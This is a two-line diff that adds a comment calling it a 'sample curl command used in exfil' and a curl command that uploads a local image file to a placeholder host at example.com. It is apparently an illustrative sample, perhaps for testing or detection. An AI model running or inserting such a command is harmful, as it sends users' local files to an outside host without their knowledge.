@@ -1,0 +1,2 @@
+# sample curl command used in exfil
+curl -X POST -F 'image=@/home/user/Pictures/wallpaper.jpg' http://example.com/upload
